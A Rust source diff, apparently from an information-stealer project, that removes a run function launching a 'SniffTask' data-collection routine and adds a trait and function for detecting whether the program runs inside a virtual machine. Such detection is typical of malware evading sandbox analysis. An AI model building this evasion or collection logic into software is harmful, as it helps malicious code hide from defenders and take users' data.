@@ -24,33 +24,45 @@
  * SOFTWARE.
  */
 
-use alloc::format;
-use collector::atomic::AtomicCollector;
-use collector::display::PrimitiveDisplayCollector;
-use filesystem::path::Path;
-use filesystem::storage::StorageFileSystem;
-use filesystem::{FileSystem, FileSystemExt};
-use ipinfo::init_ip_info;
-use shadowsniff::SniffTask;
-use tasks::Task;
-use utils::log_debug;
+#![no_std]
+
+mod kvm_check;
+
+extern crate alloc;
+
+use crate::kvm_check::KVMCheck;
+use alloc::boxed::Box;
+use alloc::vec::Vec;
+
+/// A trait for detecting whether the current process is running inside a virtual machine (VM).
+///
+/// Implement this trait for different platforms or detection mechanisms to identify
+/// if the host system is a virtualized environment.
+pub trait VmDetector {
+    /// Determines whether the current environment is a virtual machine.
+    ///
+    /// # Returns
+    ///
+    /// * `true` - if the process is likely running in a virtual machine.
+    /// * `false` - if the process is likely running a physical machine.
+    fn is_running_in_vm(&self) -> bool;
+}
+
+pub enum Check {
+    KVM,
+    Custom(Box<dyn VmDetector>),
+}
+
+impl VmDetector for Check {
+    fn is_running_in_vm(&self) -> bool {
+        match self {
+            Check::KVM => KVMCheck.is_running_in_vm(),
+            Check::Custom(check) => check.is_running_in_vm(),
+        }
+    }
+}
 
 #[inline(always)]
-pub fn run() {
-    if !init_ip_info() {
-        panic!()
-    }
-
-    let fs = StorageFileSystem;
-    let out = &Path::new("output");
-    let _ = fs.remove_dir_all(out);
-    let _ = fs.mkdir(out);
-
-    let collector = AtomicCollector::default();
-
-    SniffTask::default().run(out, &fs, &collector);
-
-    let displayed_collector = format!("{}", PrimitiveDisplayCollector(&collector));
-
-    log_debug!("{displayed_collector}");
+pub fn run_checks(checks: Vec<Check>) -> bool {
+    checks.iter().any(|v| v.is_running_in_vm())
 }
